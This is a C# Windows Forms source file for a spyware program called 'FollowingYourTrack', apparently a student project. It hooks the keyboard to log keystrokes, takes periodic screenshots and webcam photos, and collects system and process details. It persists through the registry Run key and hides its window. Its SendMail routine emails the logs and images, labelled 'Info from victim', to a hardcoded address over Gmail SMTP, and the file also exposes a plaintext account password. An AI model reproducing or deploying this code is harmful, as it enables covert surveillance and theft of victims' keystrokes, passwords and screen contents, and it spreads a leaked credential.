using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using AForge.Video;
using Microsoft.Win32;

namespace FollowingYourTrack
{
    public partial class formOption : Form
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logName = "Log_";
        private static string logExtendtion = ".txt";
        public static int portraitTimer = 5000;
        // public static int idProcessKey;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private delegate IntPtr LowLevelKeyboardProc(
       int nCode, IntPtr wParam, IntPtr lParam);
        public formOption()
        {
            InitializeComponent();
          
        }
        [DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hwc, IntPtr hwp);
        private void button1_Click(object sender, EventArgs e)
        {
            mailTime = Convert.ToInt32(txtMail.Text) * 1000;
            captureTime = Convert.ToInt32(txtPic.Text) * 1000;
            portraitTimer = Convert.ToInt32(txtPortrait.Text) * 1000;
            if (txtPath.Text == "" && chkFW.Checked)
            {
                MessageBox.Show("Please chose your path to check FileWatcher");
            }
            else
            {
                if (chkFW.Checked && txtPath.Text != "")
                {
                    FileWatcher(); //chkFW.Checked = Properties.Settings.Default.chkFW;
                    if (!chkPortrait.Checked) cam.Stop();
                }
                if (chkKey.Checked)
                {
                    // chkKey.Checked = Properties.Settings.Default.chkBoard;
                    ProcessStartInfo startinfo = new ProcessStartInfo("keylogger.exe");
                    startinfo.CreateNoWindow = false;
                    startinfo.UseShellExecute = false;
                    Process p = Process.Start(startinfo);
                    Properties.Settings.Default.idProcessKey = p.Id;
                    this.Hide();
                    //    p.WaitForExit();

                    if (!chkPortrait.Checked) cam.Stop();
                }
                if (chkMail.Checked) { tmMail.Interval = mailTime;StartTimmerMail();/* tmMail.Enabled=true; tmMail.Start();*/ }
                if (chkPic.Checked) { tmCapture.Interval = captureTime;tmCapture.Enabled = true;tmCapture.Start(); }
                if (chkProcess.Checked) { LayProcess(); if (!chkPortrait.Checked) cam.Stop(); }
                if (chkPortrait.Checked) { tmPortrait.Interval =portraitTimer;tmPortrait.Enabled = true; tmPortrait.Start(); }
                else cam.Stop();
                if (chkStartWithOS.Checked) { if (!chkPortrait.Checked) cam.Stop(); StartWithOS(); }
                else StartWithOS();
                
                Properties.Settings.Default.chkBoard = chkKey.Checked;
                Properties.Settings.Default.chkFW = chkFW.Checked;
                Properties.Settings.Default.chkMail = chkMail.Checked;
                Properties.Settings.Default.chkPic = chkPic.Checked;
                Properties.Settings.Default.chkProcess = chkProcess.Checked;
                Properties.Settings.Default.chkPortrait = chkPortrait.Checked;
                Properties.Settings.Default.chkStartWithOS = chkStartWithOS.Checked;
                Properties.Settings.Default.Save();
                this.Hide();
            }
        }
        #region Process
        public void WriteText(string temp)
        {
            StreamWriter SW = new StreamWriter(@"Process.txt", true);
            SW.WriteLine(temp);
            SW.Close();
        }
        public void LayProcess()
        {
            Process[] task = Process.GetProcesses();
            if (File.Exists(@"Process.txt"))
                File.Delete(@"Process.txt");
            try
            {
                string temp1 = string.Empty;
                temp1 += "machine name is " + System.Environment.MachineName.ToString();
                temp1 += "||software you use " + System.Environment.OSVersion.ToString();
                temp1 += "||user name is " + System.Environment.UserName.ToString();
                temp1 += "|| system start since milesecond : " + System.Environment.TickCount.ToString();
                temp1 += "\n";
                WriteText(temp1);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            foreach (Process proc in task)
            {
                //   if (listBox1.SelectedItem.ToString() == proc.ProcessName)
                // {                      
                try
                {
                    string temp = string.Empty;
                    temp += "Process ID: " + proc.Id.ToString();
                    temp += " ||Process Name: " + proc.ProcessName.ToString();
                    temp += " || User Time: " + proc.TotalProcessorTime.ToString();
                    temp += " || Start at :" + proc.StartTime.ToString();
                    temp += "\n";
                    //temp += proc..ToString();
                    //MessageBox.Show(temp);
                    WriteText(temp);
                }
                catch (Exception ex)
                {
                    // break;
                }
                // break;
                //}
            }
        }
        #endregion
        #region FileWatcher
        private static void OnChanged(object source, FileSystemEventArgs e)
        {
            try
            {
                string mes = string.Format("Copy to {0} at time : {1}", e.FullPath, DateTime.Now.ToLocalTime() + Environment.NewLine);
                File.AppendAllText(AppDomain.CurrentDomain.BaseDirectory + "logFW.txt", mes);
            }
            catch (Exception ex) { }
        }
        private static void OnChangedD(object source, FileSystemEventArgs e)
        {
            try
            {
                string mes = string.Format("File: " + e.FullPath + " Deleted at time: " + DateTime.Now.ToLocalTime() + Environment.NewLine);
                File.AppendAllText(AppDomain.CurrentDomain.BaseDirectory + "logFW.txt", mes);
            }
            catch (Exception ex) { }
        }
        private static void OnChangedC(object source, FileSystemEventArgs e)
        {
            try
            {
                // Specify what is done when a file is changed, created, or deleted.
                string mes = string.Format("File: " + e.FullPath + " Create at time: " + DateTime.Now.ToLocalTime() + Environment.NewLine);
                File.AppendAllText(AppDomain.CurrentDomain.BaseDirectory + "logFW.txt", mes);
            }
            catch (Exception ex) { }
        }
        private static void OnRenamed(object source, RenamedEventArgs e)
        {
            try
            {
                string mes = string.Format("File: {0} renamed to {1} {2}", e.OldFullPath, e.FullPath, Environment.NewLine);
                File.AppendAllText(AppDomain.CurrentDomain.BaseDirectory + "logFW.txt", mes);
            }
            catch (Exception ex) { }
        }
        void FileWatcher()
        {
            try
            {
                FileSystemWatcher watcher = new FileSystemWatcher(txtPath.Text);
                watcher.EnableRaisingEvents = true;
                //watcher.IncludeSubdirectories = true;

                // watcher.Filter = "*.txt";

                watcher.NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite
               | NotifyFilters.FileName | NotifyFilters.DirectoryName;
                watcher.Created += OnChangedC;
                watcher.Deleted += OnChangedD;
                watcher.Renamed += OnRenamed;
                watcher.Changed += OnChanged;
            }
            catch (Exception ex) { return; }
            if (this.IsDisposed) return;
        }
        #endregion
        #region Key
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                CheckHotKey(vkCode);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            //Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;

        static void CheckHotKey(int vkCode)
        {
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
                isHotKey = true;

            if (isHotKey)
            {
                if (!isShowing)
                {
                    DisplayWindow();
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        static string imagePath = "Image_";
        static string imagePathPortrait = "Portrait_";
        static string imageExtendtion = ".png";

        static int captureTime = 10000;

        static void CaptureScreen()
        {
            try
            {
                string imageCount = "-" + DateTime.Now.Hour + "#" + DateTime.Now.Minute + "#" + DateTime.Now.Second;
                //Create a new bitmap.
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                //var bmpScreenshot = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                // Create a graphics object from the bitmap.
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                // Take the screenshot from the upper left corner to the right bottom corner.
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y,
                                            0,
                                            0,
                                            Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);

                //gfxScreenshot.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();

                if (!Directory.Exists(directoryImage))
                {
                    Directory.CreateDirectory(directoryImage);
                }
                // Save the screenshot to the specified path that the user has chosen.
                string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

                bmpScreenshot.Save(imageName);
            }
            catch (Exception Ex) { }
        }
        static int interval = 1;
        //static void StartTimmerScreen()
        //{
        //    Thread thread = new Thread(() => {
        //        while (true)
        //        {
        //            Thread.Sleep(1);

        //            if (interval % captureTime == 0)
        //                CaptureScreen();


        //            interval++;

        //            if (interval >= 1000000)
        //                interval = 0;
        //        }
        //    });
        //    thread.IsBackground = true;
        //    thread.Start();
        //}
        static void StartTimmerMail()
        {

            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);


                    if (interval % mailTime == 0)
                        SendMail();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static int mailTime = 50000;
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("hiomca@gmail.com");
                mail.To.Add("15110081@student.hcmute.edu.vn");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                string directoryImagePortrait = imagePathPortrait + DateTime.Now.ToLongDateString();
                DirectoryInfo img = new DirectoryInfo(directoryImagePortrait);
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }
                //foreach (FileInfo item in img.GetFiles("*.png"))
                //{
                //    if (File.Exists(directoryImagePortrait + "\\" + item.Name))
                //        mail.Attachments.Add(new Attachment(directoryImagePortrait + "\\" + item.Name));
                //}
                if (File.Exists("log.txt"))
                {
                    mail.Attachments.Add(new Attachment("log.txt"));
                }
                if (File.Exists("Process.txt"))
                {
                    mail.Attachments.Add(new Attachment("Process.txt"));
                }
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("hiomca@gmail.com", "Quycodaycot0");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                // phải làm cái này ở mail dùng để gửi phải bật lên
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion


        private void formOption_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!chkPortrait.Checked) cam.Stop();
        }
        public static FilterInfoCollection webcam;
        public static VideoCaptureDevice cam;
        private void formOption_Load(object sender, EventArgs e)
        {
            chkFW.Checked = Properties.Settings.Default.chkFW;
            chkKey.Checked = Properties.Settings.Default.chkBoard;
            chkMail.Checked = Properties.Settings.Default.chkMail;
            chkPic.Checked = Properties.Settings.Default.chkPic;
            chkProcess.Checked = Properties.Settings.Default.chkProcess;
            chkPortrait.Checked = Properties.Settings.Default.chkPortrait;
            chkStartWithOS.Checked = Properties.Settings.Default.chkStartWithOS;
            webcam = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            foreach (FilterInfo VideoCaptureDevice in webcam)
            {
                comboBox1.Items.Add(VideoCaptureDevice.Name);
            }
            comboBox1.SelectedIndex = 0;
            cam = new VideoCaptureDevice(webcam[comboBox1.SelectedIndex].MonikerString);
            cam.NewFrame += new NewFrameEventHandler(cam_NewFrame);
            cam.Start();
        }
        void cam_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            //throw new NotImplementedException();
            Bitmap bit = (Bitmap)eventArgs.Frame.Clone();
            pictureBox1.Image = bit;
        }
        void StartWithOS()
        {
            string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            Microsoft.Win32.RegistryKey startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey);

            if (chkStartWithOS.Checked)
            {
                if (startupKey.GetValue("FollowingYourTrack") == null)
                {
                    startupKey.Close();
                    startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey, true);
                    // Add startup reg key
                    //  startupKey.SetValue("FollowingYourTrack", Application.ExecutablePath.ToString());
                    startupKey.SetValue("FollowingYourTrack", Application.StartupPath + "\\FollowingYourTrack.exe");
                    startupKey.Close();
                }
            }
            else
            {
                // remove startup
                startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey, true);
                startupKey.DeleteValue("FollowingYourTrack", false);

                startupKey.Close();
            }

        }
        public class StartUpProgram

        {

            public string Name { get; set; }


            public string Path { get; set; }

            //show name in checkboxitem

            public override string ToString()

            {

                return Name;

            }

        }
        private void tmPortrait_Tick(object sender, EventArgs e)
        {
            string imagePath = "Portrait_";
            string imageExtendtion = ".png";
            string imageCount = "-" + DateTime.Now.Hour + "#" + DateTime.Now.Minute + "#" + DateTime.Now.Second;
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);
            // saveFileDialog1.InitialDirectory = @"E:\do an 1\FollowingYourTrack\FollowingYourTrack\bin\Debug\" + directoryImage;
            pictureBox1.Image.Save(imageName);
        }

        private void btnPath_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog openFileDialog = new FolderBrowserDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtPath.Text = openFileDialog.SelectedPath;
            }
        }

        private void tmMail_Tick(object sender, EventArgs e)
        {
            SendMail();
        }

        private void tmCapture_Tick(object sender, EventArgs e)
        {
            CaptureScreen();
        }
    }
}
